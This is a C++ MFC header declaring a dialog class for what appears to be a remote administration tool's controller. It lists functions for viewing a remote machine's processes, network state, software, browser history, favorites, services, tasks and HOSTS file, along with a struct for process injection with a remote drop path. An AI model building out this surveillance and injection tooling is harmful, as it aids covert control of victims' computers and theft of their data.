
#pragma once

/////////////////////////////////////////////////////////////////////////////
// CMachineDlg dialog






class CMachineDlg : public CXTPResizeDialog
{
	// Construction
public:
	CMachineDlg(CWnd* pParent = NULL, ISocketBase* pIOCPServer = NULL, ClientContext* pContext = NULL);   // standard constructor
	

	// Dialog Data
		//{{AFX_DATA(CMachineDlg)
	enum { IDD = IDD_MACHINE };
	CXTPListCtrl	m_list;
	CXTPTabCtrl m_tab;
	// NOTE: the ClassWizard will add data members here
//}}AFX_DATA
	CXTHeaderCtrl   m_heades;

	void OnReceiveComplete();
	void OnReceive();
	// Overrides
		// ClassWizard generated virtual function overrides
		//{{AFX_VIRTUAL(CMachineDlg)

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual void OnCancel();

	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	//}}AFX_VIRTUAL

	int             m_nSortedCol;
	bool            m_bAscending;
	// Implementation
protected:
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	HICON m_hIcon;
	BOOL m_bOnClose;
	CMainFrame* pFrame;
	CXTPStatusBar m_wndStatusBar;
	CString strMsgShow;

	//char* TcharToChar(const TCHAR* tchar, char* _char);
	//TCHAR* CharToTchar(const char* _char, TCHAR* tchar);
   // Generated message map functions
   //{{AFX_MSG(CMachineDlg)
	//afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSelChangingTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam); // 自定义消息
	void SortColumn(int iCol, bool bAsc);
	CString oleTime2Str(double time);
	void reflush();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
public:
	void SendToken(BYTE bToken);
	void AdjustList();
	void OpenInfoDlg();
	 void SetClipboardText(CString& Data);
	 CString __MakePriority(DWORD dwPriClass);
	void DeleteList();
	void ShowProcessList(); //进程
	void ShowWindowsList();//窗口
	void ShowNetStateList();//网络
	void ShowSoftWareList();//软件列表
	void ShowIEHistoryList();//html浏览记录
	void ShowFavoritesUrlList();//收藏夹
	void ShowServiceList(); //服务
	void ShowTaskList();//计划任务
	void ShowHostsList();//HOSTS

	//对应菜单
	void ShowProcessList_menu(); //进程
	void ShowWindowsList_menu();//窗口
	void ShowNetStateList_menu();//网络
	void ShowSoftWareList_menu();//软件列表
	void ShowIEHistoryList_menu();//html浏览记录
	void ShowFavoritesUrlList_menu();//收藏夹
	void ShowServiceList_menu();//服务
	void ShowTaskList_menu();//计划任务
	void ShowHostsList_menu();//HOSTS


};




struct  Browsinghistory
{
	TCHAR strTime[100];
	TCHAR strTitle[1024];
	TCHAR strUrl[1024];

};

struct  InjectData
{
	DWORD ExeIsx86;
	DWORD mode;		//注入模式
	DWORD dwProcessID;//进程ID
	DWORD datasize;   //本地数据尺寸
	TCHAR strpath[1024]; //远程落地目录
};